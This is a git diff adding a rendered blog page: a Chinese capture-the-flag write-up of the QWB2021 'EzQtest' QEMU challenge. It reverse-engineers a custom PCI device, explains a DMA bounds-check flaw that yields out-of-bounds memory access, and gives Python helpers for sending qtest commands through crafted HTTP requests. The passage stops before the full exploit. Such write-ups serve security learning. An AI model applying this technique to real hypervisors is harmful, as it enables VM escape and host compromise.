@@ -1,38 +1,802 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!doctype html>
 
 
-{% block title %} {{ page.title }} | {{ config.title }} {% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+
+    
+  
+
+<html class="theme-next logos use-motion" lang="zh-hk">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="第五届强网杯的虚拟化系列题目，EzQtest 2解477分。这题赛后第二天才完成。承接EzCloud，有意思的才刚刚开始。整个学期都在搞毕业论文，答辩结束后能解决这样一道大题，有种在水下憋气很久，突然能浮出水面大口呼吸的畅快感觉。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[QWB2021 Quals] - EzQtest">
+<meta property="og:url" content="http://matshao.com/2021/06/15/QWB2021-Quals-EzQtest/index.html">
+<meta property="og:site_name" content="Mid Station">
+<meta property="og:description" content="第五届强网杯的虚拟化系列题目，EzQtest 2解477分。这题赛后第二天才完成。承接EzCloud，有意思的才刚刚开始。整个学期都在搞毕业论文，答辩结束后能解决这样一道大题，有种在水下憋气很久，突然能浮出水面大口呼吸的畅快感觉。">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://i.loli.net/2021/06/15/4HeUZ67czkb9VGl.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/15/wN1TRIKfUQYEoub.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/15/GcODnj5Ietxbd2m.png">
+<meta property="og:updated_time" content="2021-06-15T15:58:21.510Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[QWB2021 Quals] - EzQtest">
+<meta name="twitter:description" content="第五届强网杯的虚拟化系列题目，EzQtest 2解477分。这题赛后第二天才完成。承接EzCloud，有意思的才刚刚开始。整个学期都在搞毕业论文，答辩结束后能解决这样一道大题，有种在水下憋气很久，突然能浮出水面大口呼吸的畅快感觉。">
+<meta name="twitter:image" content="https://i.loli.net/2021/06/15/4HeUZ67czkb9VGl.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Logos',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://matshao.com/2021/06/15/QWB2021-Quals-EzQtest/">
+
+
+
+
+
+  <title> [QWB2021 Quals] - EzQtest | Mid Station </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="header-logos"> 
+      <div class="site-meta ">
+  
+    <div class="site-meta-headline">
+      <a href="/">
+        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
+      </a>
+    </div>
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Mid Station</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            關於
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ 
+            
+      </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://matshao.com/2021/06/15/QWB2021-Quals-EzQtest/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="Matthew Shao">
+    <meta itemprop="description" content>
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Mid Station">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                [QWB2021 Quals] - EzQtest
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-06-15T14:14:57+08:00">
+                2021-06-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hack/" itemprop="url" rel="index">
+                    <span itemprop="name">Hack</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>第五届强网杯的虚拟化系列题目，EzQtest 2解477分。这题赛后第二天才完成。承接EzCloud，有意思的才刚刚开始。<br>整个学期都在搞毕业论文，答辩结束后能解决这样一道大题，有种在水下憋气很久，突然能浮出水面大口呼吸的畅快感觉。</p>
+<a id="more"></a>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>回顾上一问的post handler，在伪造登录信息以后可以使用vm系列操作，其中<code>createvm</code>会调用<code>nc 127.0.0.1 6666</code>并建立管道，之后通过<code>connetvm</code>向管道读写命令。而6666端口是附件中<code>launch.sh</code>启动的qemu服务。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">post_handler</span><span class="params">(request *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;path.sz == <span class="number">6L</span>L &amp;&amp; !<span class="built_in">memcmp</span>(a1-&gt;path.buf, <span class="string">"/login"</span>, <span class="number">6u</span>LL) )</span><br><span class="line">    <span class="keyword">return</span> do_login(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;path.sz == <span class="number">7L</span>L &amp;&amp; !<span class="built_in">memcmp</span>(a1-&gt;path.buf, <span class="string">"/logout"</span>, <span class="number">7u</span>LL) )</span><br><span class="line">    <span class="keyword">return</span> do_logout(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;path.sz == <span class="number">9L</span>L &amp;&amp; !<span class="built_in">memcmp</span>(a1-&gt;path.buf, <span class="string">"/createvm"</span>, <span class="number">9u</span>LL) )</span><br><span class="line">    <span class="keyword">return</span> do_createvm(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;path.sz == <span class="number">10L</span>L &amp;&amp; !<span class="built_in">memcmp</span>(a1-&gt;path.buf, <span class="string">"/connectvm"</span>, <span class="number">0xA</span>uLL) )</span><br><span class="line">    <span class="keyword">return</span> do_connectvm(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;path.sz == <span class="number">8L</span>L &amp;&amp; !<span class="built_in">memcmp</span>(a1-&gt;path.buf, <span class="string">"/closevm"</span>, <span class="number">8u</span>LL) )</span><br><span class="line">    <span class="keyword">return</span> do_closevm(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;path.sz == <span class="number">8L</span>L &amp;&amp; !<span class="built_in">memcmp</span>(a1-&gt;path.buf, <span class="string">"/notepad"</span>, <span class="number">8u</span>LL) )</span><br><span class="line">    <span class="keyword">return</span> do_notepad(a1);</span><br><span class="line">  <span class="keyword">return</span> html_404((__int64)a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>launsh.sh</code>启动的qemu服务和以前见过的都不同，这里启动了一个qtest命令行，提供了内存读写相关的命令，具体可以参考<a href="https://qemu.readthedocs.io/en/latest/devel/qtest.html" target="_blank" rel="noopener">QTest Device Emulation Testing Framework</a>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64  -display  none -machine  accel=qtest -m  512M -device  qwb -nodefaults -monitor none -qtest  stdio</span><br></pre></td></tr></table></figure>
+
+<p>用apt安装缺少的依赖库之后就可以进入qtest的命令行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@matthew-Virtual-Machine:/pwn# ./launch.sh</span><br><span class="line">[I 1623743050.286546] OPENED</span><br><span class="line">clock_step</span><br><span class="line">[R +3.476847] clock_step</span><br><span class="line">OK 27462700</span><br><span class="line">[S +3.476909] OK 27462700</span><br><span class="line">writeq 0 0x1234</span><br><span class="line">[R +13.033245] writeq 0 0x1234</span><br><span class="line">OK</span><br><span class="line">[S +13.037377] OK</span><br><span class="line">readq 0</span><br><span class="line">[R +15.940001] readq 0</span><br><span class="line">OK 0x0000000000001234</span><br><span class="line">[S +15.940060] OK 0x0000000000001234</span><br></pre></td></tr></table></figure>
+
+<p>为了验证远程的逻辑是否和我们设想的一致，我先写了exp中的交互接口</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createvm</span><span class="params">(login_id)</span>:</span></span><br><span class="line">    payload = <span class="string">"POST /createvm HTTP/1.1\r\n"</span></span><br><span class="line">    payload += <span class="string">"Login-ID: &#123;&#125;\r\n"</span>.format(login_id)</span><br><span class="line">    payload += <span class="string">"\r\n"</span></span><br><span class="line">    se(payload)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    ru(<span class="string">"&lt;/html&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connectvm</span><span class="params">(login_id, cmd=<span class="string">""</span>)</span>:</span></span><br><span class="line">    payload = <span class="string">"POST /connectvm HTTP/1.1\r\n"</span></span><br><span class="line">    payload += <span class="string">"Login-ID: &#123;&#125;\r\n"</span>.format(login_id)</span><br><span class="line">    payload += <span class="string">"Content-Length: 65535\r\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Type: application/x-www-form-urlencoded\r\n"</span></span><br><span class="line">    payload += <span class="string">"\r\n"</span></span><br><span class="line">    payload += cmd</span><br><span class="line">    se(payload)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    ru(<span class="string">"&lt;/html&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    payload = <span class="string">"POST /foo HTTP/1.1\r\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Type: application/x-www-form-urlencoded\r\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Length: 65535\r\n"</span></span><br><span class="line">    payload += <span class="string">"\r\n"</span></span><br><span class="line">    payload += urlencode(cmd + <span class="string">"\n"</span>) <span class="comment"># 结尾要加"\n",不可见字符需要urlencode</span></span><br><span class="line">    se(payload)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    content = ru(<span class="string">"&lt;/html&gt;"</span>)</span><br><span class="line">    content = re.search(<span class="string">r"&lt;p&gt;(.*)&lt;\/p&gt;"</span>,content, re.M|re.S).group(<span class="number">1</span>).strip()</span><br><span class="line">    value = re.search(<span class="string">r"OK ([^\s]*)"</span>, content)</span><br><span class="line">    <span class="keyword">if</span> value:</span><br><span class="line">        <span class="keyword">return</span> value.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> content</span><br></pre></td></tr></table></figure>
+
+<p>本地启动时用ncat将stdio转发到6666端口，但是测试发现和远程的返回内容不一致。后来发现是ncat没有将stderr也转发到tcp端口，之后找到一条socat转发的命令，可以将stdout和stderr同时转发到tcp端口。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">socat TCP4-LISTEN:6666,reuseaddr,fork EXEC:"./launch.sh",stderr</span><br></pre></td></tr></table></figure>
+
+<p>完成配置以后就能够通过EzCloud的binary和qemu服务正常交互了。</p>
+<h2 id="QEMU设备逆向"><a href="#QEMU设备逆向" class="headerlink" title="QEMU设备逆向"></a>QEMU设备逆向</h2><p>在启动命令的提示下，很容易就能在<code>qemu-system-x86_64</code>里面找到qwb设备的具体实现，qwb设备设置了一个mmio接口。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">pci_qwb_realize</span><span class="params">(PCIDevice_0 *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD qwb; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  qwb = QWB(pdev);</span><br><span class="line">  memory_region_init_io(&amp;qwb-&gt;mmio, &amp;qwb-&gt;pdev.qdev.parent_obj, &amp;qwb_mmio_ops, qwb, <span class="string">"qwb-mmio"</span>, <span class="number">0x100000</span>uLL);</span><br><span class="line">  pci_register_bar(pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;qwb-&gt;mmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>qwb_mmio_read</code>和<code>qwb_mmio_write</code>部分switch语句ida分析不出来，逻辑不复杂直接看汇编代码也能看懂。但是这里推荐一波binary ninja，反编译功能越来越强了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">qwb_mmio_read</span><span class="params">(struct qwb_state* arg1, <span class="keyword">int64_t</span> arg2, <span class="keyword">int32_t</span> arg3)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">uint64_t</span> var_18 </span>= <span class="number">-1</span></span><br><span class="line">    <span class="keyword">uint64_t</span> rax_1</span><br><span class="line">    <span class="keyword">if</span> (arg3 != <span class="number">8</span>)</span><br><span class="line">        rax_1 = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> (arg2 u&lt;= <span class="number">0x30</span>)</span><br><span class="line">            <span class="keyword">switch</span> (arg2)</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span></span><br><span class="line">                    var_18 = zx.q(arg1-&gt;dma_using)</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span></span><br><span class="line">                    <span class="keyword">if</span> (arg1-&gt;dma_info_size == <span class="number">0</span>)</span><br><span class="line">                        var_18 = zx.q(arg1-&gt;dma_idx)</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x10</span></span><br><span class="line">                    <span class="keyword">if</span> (arg1-&gt;dma_info_size == <span class="number">0</span> &amp;&amp; arg1-&gt;dma_idx u&lt;= <span class="number">0x1f</span>)</span><br><span class="line">                        var_18 = *(arg1 + ((zx.q(arg1-&gt;dma_idx) + <span class="number">0x50</span>) &lt;&lt; <span class="number">5</span>)) <span class="comment">// src</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x18</span></span><br><span class="line">                    <span class="keyword">if</span> (arg1-&gt;dma_info_size == <span class="number">0</span> &amp;&amp; arg1-&gt;dma_idx u&lt;= <span class="number">0x1f</span>)</span><br><span class="line">                        var_18 = *(arg1 + ((zx.q(arg1-&gt;dma_idx) + <span class="number">0x50</span>) &lt;&lt; <span class="number">5</span>) + <span class="number">8</span>) <span class="comment">// dst</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x20</span></span><br><span class="line">                    <span class="keyword">if</span> (arg1-&gt;dma_info_size == <span class="number">0</span> &amp;&amp; arg1-&gt;dma_idx u&lt;= <span class="number">0x1f</span>)</span><br><span class="line">                        var_18 = *(arg1 + (zx.q(arg1-&gt;dma_idx) &lt;&lt; <span class="number">5</span>) + <span class="number">0xa10</span>) <span class="comment">// cnt</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x28</span></span><br><span class="line">                    <span class="keyword">if</span> (arg1-&gt;dma_info_size == <span class="number">0</span> &amp;&amp; arg1-&gt;dma_idx u&lt;= <span class="number">0x1f</span>)</span><br><span class="line">                        var_18 = *(arg1 + (zx.q(arg1-&gt;dma_idx) &lt;&lt; <span class="number">5</span>) + <span class="number">0xa18</span>) <span class="comment">// cmd</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x30</span></span><br><span class="line">                    <span class="keyword">if</span> (arg1-&gt;dma_info_size == <span class="number">0</span>)</span><br><span class="line">                        qwb_do_dma(arg1)</span><br><span class="line">                        var_18 = <span class="number">1</span></span><br><span class="line">        rax_1 = var_18</span><br><span class="line">    <span class="keyword">return</span> rax_1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct qwb_state* <span class="title">qwb_mmio_write</span><span class="params">(struct qwb_state* arg1, <span class="keyword">int64_t</span> arg2, struct qwb_state* arg3, <span class="keyword">int32_t</span> arg4)</span></span></span><br><span class="line"><span class="function">    struct qwb_state* rax </span>= arg1</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qwb_state</span>* <span class="title">var_10</span> = <span class="title">rax</span></span></span><br><span class="line"><span class="class">    <span class="title">if</span> (<span class="title">arg4</span> == 8 &amp;&amp; <span class="title">arg2</span> <span class="title">u</span>&lt;= 0x28)</span></span><br><span class="line"><span class="class">        rax = sx.q(jump_table_a7e7ac[arg2]) + &amp;jump_table_a7e7ac</span></span><br><span class="line"><span class="class">        switch (rax)</span></span><br><span class="line"><span class="class">            case 0x389216</span></span><br><span class="line"><span class="class">                if (arg3 u&lt;= 0x20)</span></span><br><span class="line"><span class="class">                    rax = var_10</span></span><br><span class="line"><span class="class">                    rax-&gt;dma_using = arg3.d</span></span><br><span class="line"><span class="class">            case 0x389236</span></span><br><span class="line"><span class="class">                rax = zx.q(var_10-&gt;<span class="title">dma_info_size</span>)</span></span><br><span class="line"><span class="class">                <span class="title">if</span> (<span class="title">rax</span>.<span class="title">d</span> == 0 &amp;&amp; <span class="title">arg3</span> <span class="title">u</span>&lt;= 0x1f)</span></span><br><span class="line"><span class="class">                    rax = var_10</span></span><br><span class="line"><span class="class">                    rax-&gt;<span class="title">dma_idx</span> = <span class="title">arg3</span>.<span class="title">d</span></span></span><br><span class="line"><span class="class">            <span class="title">case</span> 0<span class="title">x389268</span></span></span><br><span class="line"><span class="class">                <span class="title">rax</span> = <span class="title">zx</span>.<span class="title">q</span>(<span class="title">var_10</span>-&gt;<span class="title">dma_info_size</span>)</span></span><br><span class="line"><span class="class">                <span class="title">if</span> (<span class="title">rax</span>.<span class="title">d</span> == 0)</span></span><br><span class="line"><span class="class">                    <span class="title">rax</span> = <span class="title">zx</span>.<span class="title">q</span>(<span class="title">var_10</span>-&gt;<span class="title">dma_idx</span>)</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> (<span class="title">rax</span>.<span class="title">d</span> <span class="title">u</span>&lt;= 0x1f)</span></span><br><span class="line"><span class="class">                        rax = arg3</span></span><br><span class="line"><span class="class">                        *(((zx.q(var_10-&gt;<span class="title">dma_idx</span>) + 0<span class="title">x50</span>) &lt;&lt; 5) + var_10) = rax // src</span></span><br><span class="line"><span class="class">            case 0x3892b4</span></span><br><span class="line"><span class="class">                rax = zx.q(var_10-&gt;dma_info_size)</span></span><br><span class="line"><span class="class">                if (rax.d == 0)</span></span><br><span class="line"><span class="class">                    rax = zx.q(var_10-&gt;<span class="title">dma_idx</span>)</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> (<span class="title">rax</span>.<span class="title">d</span> <span class="title">u</span>&lt;= 0x1f)</span></span><br><span class="line"><span class="class">                        rax = arg3</span></span><br><span class="line"><span class="class">                        *(var_10 + ((zx.q(var_10-&gt;<span class="title">dma_idx</span>) + 0<span class="title">x50</span>) &lt;&lt; 5) + 8) = rax // dst</span></span><br><span class="line"><span class="class">            case 0x389304</span></span><br><span class="line"><span class="class">                rax = zx.q(var_10-&gt;dma_info_size)</span></span><br><span class="line"><span class="class">                if (rax.d == 0)</span></span><br><span class="line"><span class="class">                    rax = zx.q(var_10-&gt;<span class="title">dma_idx</span>)</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> (<span class="title">rax</span>.<span class="title">d</span> <span class="title">u</span>&lt;= 0x1f)</span></span><br><span class="line"><span class="class">                        rax = arg3</span></span><br><span class="line"><span class="class">                        *(var_10 + (zx.q(var_10-&gt;<span class="title">dma_idx</span>) &lt;&lt; 5) + 0xa10) = rax // cnt</span></span><br><span class="line"><span class="class">            case 0x389350</span></span><br><span class="line"><span class="class">                rax = zx.q(var_10-&gt;dma_info_size)</span></span><br><span class="line"><span class="class">                if (rax.d == 0)</span></span><br><span class="line"><span class="class">                    rax = zx.q(var_10-&gt;<span class="title">dma_idx</span>)</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> (<span class="title">rax</span>.<span class="title">d</span> <span class="title">u</span>&lt;= 0x1f)</span></span><br><span class="line"><span class="class">                        rax = var_10 + (zx.q(var_10-&gt;<span class="title">dma_idx</span>) &lt;&lt; 5) + 0xa18 // cmd</span></span><br><span class="line"><span class="class">                        rax-&gt;__offset(0x0).q = zx.q(arg3.d &amp; 1)</span></span><br><span class="line"><span class="class">    return rax</span></span><br></pre></td></tr></table></figure>
+
+<p>主要结构体如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QWBState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  uint32_t_0 dma_info_size;</span><br><span class="line">  uint32_t_0 dma_info_idx;</span><br><span class="line">  uint32_t_0 dma_using;</span><br><span class="line">  dma_state dma_info[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">char</span> dma_buf[<span class="number">4096</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑还是比较简单的，我们可以通过mmio设置dma_info的src，dst，cnt，cmd(读写方向)，然后触发<code>qwb_do_dma</code>完成dma的读写操作。问题就是出在<code>qwb_do_dma</code>函数中。这里的问题是先检查所有dma_info的越界再进行操作，而检查的循环逻辑也不严谨，可以导致利用前面dma_info来改写后面的dma_info，到执行后面dma_info的时候就可以完成越界读写操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 